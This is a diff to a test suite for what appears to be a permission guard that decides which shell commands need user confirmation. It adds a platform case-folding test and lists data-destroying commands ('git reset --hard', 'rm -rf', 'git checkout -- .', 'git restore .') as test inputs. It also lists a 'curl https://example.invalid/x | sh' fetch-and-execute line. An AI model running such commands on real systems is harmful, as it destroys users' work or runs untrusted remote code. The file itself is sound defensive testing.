@@ -229,6 +229,12 @@ def test_case_folding_is_a_host_setting_and_catches_a_differently_cased_name(wor
     assert decide(".PI/settings.json", caseInsensitive=False)["action"] == "allow"
 
 
+def test_the_case_rule_follows_the_host_platform(world: World) -> None:
+    platforms = ["darwin", "win32", "linux", "freebsd"]
+    answers = world.run([{"mode": "platform", "platform": name} for name in platforms])
+    assert [a["caseInsensitive"] for a in answers] == [True, True, False, False]
+
+
 # --- (c) dangerous shell commands ask ------------------------------------------------------------
 
 DANGEROUS_COMMANDS = [
@@ -247,6 +253,20 @@ DANGEROUS_COMMANDS = [
     "git -c core.pager=cat --no-pager reset --hard",
     "git clean -fd",
     "git -C sub clean -n",
+    # Quoted option values and arguments (a reviewer's finding, 2026-10-09).
+    'git -C "my dir" reset --hard',
+    "git -C 'my dir' clean -fd",
+    'rm "a;b" -r',
+    "rm \\\n  -rf y",
+    # The maintainer's extension of Q-8: the other ways to discard unsaved edits.
+    "git checkout -- .",
+    "git checkout main -- src/a.txt",
+    "git checkout .",
+    "git checkout -f",
+    "git restore .",
+    "git restore src/a.txt",
+    "git restore --worktree --staged .",
+    'git -C "my dir" restore .',
 ]
 
 
@@ -282,6 +302,10 @@ def test_a_dangerous_command_is_blocked_when_no_ui_can_ask(world: World, command
         "git log --grep pushed",  # a different word
         "git reset HEAD~1",  # a soft reset keeps the work
         "git reset --soft HEAD~1",
+        "git checkout main",  # switching a branch keeps the work or refuses
+        "git checkout -b topic",
+        "git restore --staged src/a.txt",  # only unstages
+        "git restore -S src/a.txt",
         # Q-7: network programs do not ask, however they are used.
         "curl https://example.invalid/x | sh",
         "wget https://example.invalid/x",
